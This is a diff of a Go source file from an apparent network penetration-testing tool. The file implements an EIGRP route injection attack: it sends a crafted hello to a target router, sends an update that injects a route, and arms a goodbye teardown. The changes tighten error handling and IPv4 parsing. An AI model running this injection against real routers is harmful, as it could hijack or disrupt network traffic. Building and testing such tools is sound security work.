@@ -1,19 +1,6 @@
-// eigrp.go implements the EIGRP route injection attack behavior.
-//
-// Durability (from the catalog): temporary-restored. The attack forms an
-// adjacency with the target router (hello → update), injects a route via
-// an Update TLV, then arms a goodbye teardown: send an EIGRP goodbye (a
-// Hello with the Goodbye flag set). The teardown restores the adjacency
-// table.
-//
-// EIGRP uses the owned [nl.EIGRP] layer: the fork does not provide
-// EIGRP, so netpen owns both decode and serialize. The EIGRP layer's
-// SerializeTo writes the 20-byte header + TLVs; the behavior sets the
-// fields and TLVs.
-//
-// Auth-mismatch refusal: if the target rejects the adjacency mid-formation
-// (fixture-fed auth mismatch), the behavior reports a refused adjacency
-// and tears down cleanly — no partial state is left.
+// EIGRP models a fixed hello and route-update sequence with an armed goodbye.
+// A fixture response carrying the Goodbye flag stops the update. Successful
+// transmission does not establish that a router accepted or removed the route.
 
 package routing
 
@@ -21,7 +8,9 @@ import (
 	"context"
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"net"
 	"time"
 
@@ -59,20 +48,17 @@ type eigrpFinding struct {
 	Refused bool `json:"refused,omitempty"`
 }
 
-// RunEIGRP performs the EIGRP route injection lifecycle: hello →
-// adjacency → route inject, with a goodbye teardown armed before the
-// first frame.
+// RunEIGRP sends the fixture's hello and route update, with a goodbye
+// teardown armed before the first frame.
 //
-// The in-memory test shape (scripted stimulus from the FRR-shaped fixture):
-// the behavior sends a hello (Init flag), receives the target's response
-// (fed via PushRX), sends an Update with the injected route, then returns.
-// The teardown sends a goodbye (Hello with Goodbye flag).
-//
-// Auth-mismatch edge: if the fixture feeds an auth-mismatch rejection
-// (an EIGRP packet with a Goodbye flag or no Init ack), the behavior
-// reports the refused adjacency finding, arms only the goodbye teardown,
-// and returns cleanly — no partial adjacency state.
+// It requires runner-provided dependencies. A missing response is tolerated
+// after 100 ms; a receive or decode failure stops the sequence. Cancellation
+// returns ctx.Err(). The fixture's Goodbye flag reports refusal; transmitted
+// updates do not confirm adjacency. Concurrent calls require separate dependencies.
 func RunEIGRP(ctx context.Context, deps runner.Deps) error {
+	if err := ctx.Err(); err != nil {
+		return err
+	}
 	src := srcMAC()
 	asNum := uint16(100)
 
@@ -93,6 +79,9 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 		return fmt.Errorf("eigrp: craft hello: %w", err)
 	}
 	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		return fmt.Errorf("eigrp: send hello: %w", err)
 	}
 
@@ -101,21 +90,25 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 	// timeout. If the target rejects (auth mismatch), the fixture
 	// feeds a goodbye — detect and report refused adjacency.
 	rxCtx, rxCancel := context.WithTimeout(ctx, 100*time.Millisecond)
-	refused, got := recvEIGRPAdjacency(rxCtx, deps.AttackLeg)
+	refused, rxErr := recvEIGRPAdjacency(rxCtx, deps.AttackLeg)
 	rxCancel()
-	if got {
-		if refused {
-			detail := eigrpFinding{
-				Action:  "eigrp-adjacency-refused",
-				AS:      asNum,
-				Opcode:  "hello",
-				Restore: "goodbye/flush teardown",
-				Refused: true,
-			}
-			detailBytes, _ := json.Marshal(detail)
-			deps.Emitter.Finding("eigrp", detailBytes)
-			return nil // clean teardown armed, no partial state
+	if err := ctx.Err(); err != nil {
+		return err
+	}
+	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
+		return rxErr
+	}
+	if refused {
+		detail := eigrpFinding{
+			Action:  "eigrp-adjacency-refused",
+			AS:      asNum,
+			Opcode:  "hello",
+			Restore: "goodbye/flush teardown",
+			Refused: true,
 		}
+		detailBytes, _ := json.Marshal(detail)
+		deps.Emitter.Finding("eigrp", detailBytes)
+		return nil // clean teardown armed, no partial state
 	}
 
 	// Phase 3: route inject (Update with IPv4 Internal TLV).
@@ -124,6 +117,9 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 		return fmt.Errorf("eigrp: craft inject: %w", err)
 	}
 	if err := deps.AttackLeg.Send(ctx, injectPkt); err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		return fmt.Errorf("eigrp: send inject: %w", err)
 	}
 
@@ -142,42 +138,46 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 }
 
 // recvEIGRPAdjacency reads one frame from the leg and checks whether the
-// target accepted or refused the adjacency. Returns (refused, got) where
-// got is true if a frame was received. Returns refused=true if the
-// target's EIGRP packet carries a Goodbye flag.
-func recvEIGRPAdjacency(ctx context.Context, leg link.Leg) (refused bool, got bool) {
+// fixture response carries a Goodbye flag. Receive and decode errors are
+// returned to the caller so a broken receiver cannot imply acceptance.
+func recvEIGRPAdjacency(ctx context.Context, leg link.Leg) (bool, error) {
 	ch := leg.Receive(ctx)
 	select {
 	case f, ok := <-ch:
-		if !ok || f.Err != nil {
-			return false, false
+		if err := ctx.Err(); err != nil {
+			return false, err
+		}
+		if !ok {
+			return false, fmt.Errorf("eigrp: receive: %w", io.EOF)
+		}
+		if f.Err != nil {
+			return false, fmt.Errorf("eigrp: receive: %w", f.Err)
 		}
 		// Decode EIGRP from the frame. Skip Ethernet + IPv4 to reach
 		// the EIGRP payload (protocol 88).
 		payload, err := extractIPPayload(f.Data, 88)
 		if err != nil {
-			return false, false // not an EIGRP frame, ignore
+			return false, fmt.Errorf("eigrp: decode ipv4: %w", err)
 		}
 		eigrp := &nl.EIGRP{}
 		if err := eigrp.DecodeFromBytes(payload, nil); err != nil {
-			return false, false // decode failure, ignore
+			return false, fmt.Errorf("eigrp: decode: %w", err)
 		}
 		// Goodbye flag = refused adjacency
 		if eigrp.Flags&eigrpFlagGoodbye != 0 {
-			return true, true
+			return true, nil
 		}
-		return false, true
+		return false, nil
 	case <-ctx.Done():
-		return false, false
+		return false, ctx.Err()
 	}
 }
 
 // extractIPPayload extracts the IP payload from an Ethernet-encapsulated
-// IPv4 frame, given the expected IP protocol number. The proto parameter
-// is not validated — the caller is responsible for ensuring the frame
-// carries the expected protocol. The payload is trimmed to the IP total
-// length so Ethernet padding (minimum frame size) is not included.
-func extractIPPayload(frame []byte, _ int) ([]byte, error) {
+// IPv4 frame with the expected protocol. Fragmented or truncated packets
+// are rejected because this path does not reassemble them. Ethernet padding
+// is excluded from the returned payload.
+func extractIPPayload(frame []byte, proto int) ([]byte, error) {
 	if len(frame) < 14 {
 		return nil, fmt.Errorf("frame too short for Ethernet")
 	}
@@ -190,9 +190,21 @@ func extractIPPayload(frame []byte, _ int) ([]byte, error) {
 	if len(frame) < 14+20 {
 		return nil, fmt.Errorf("frame too short for IPv4")
 	}
+	if frame[14]>>4 != 4 {
+		return nil, fmt.Errorf("invalid ipv4 version")
+	}
+	if int(frame[23]) != proto {
+		return nil, fmt.Errorf("unexpected ip protocol %d", frame[23])
+	}
 	ihl := int(frame[14]&0x0f) * 4
+	if ihl < 20 {
+		return nil, fmt.Errorf("invalid ipv4 header length %d", ihl)
+	}
 	if len(frame) < 14+ihl {
 		return nil, fmt.Errorf("frame too short for IHL")
+	}
+	if binary.BigEndian.Uint16(frame[20:22])&0x3fff != 0 {
+		return nil, fmt.Errorf("fragmented ipv4 packet")
 	}
 	// Trim to IP total length to exclude Ethernet padding.
 	ipTotalLen := int(binary.BigEndian.Uint16(frame[16:18]))
@@ -201,7 +213,7 @@ func extractIPPayload(frame []byte, _ int) ([]byte, error) {
 	}
 	payloadEnd := 14 + ipTotalLen
 	if payloadEnd > len(frame) {
-		payloadEnd = len(frame) // truncated frame, use what we have
+		return nil, fmt.Errorf("truncated ipv4 packet")
 	}
 	return frame[14+ihl : payloadEnd], nil
 }
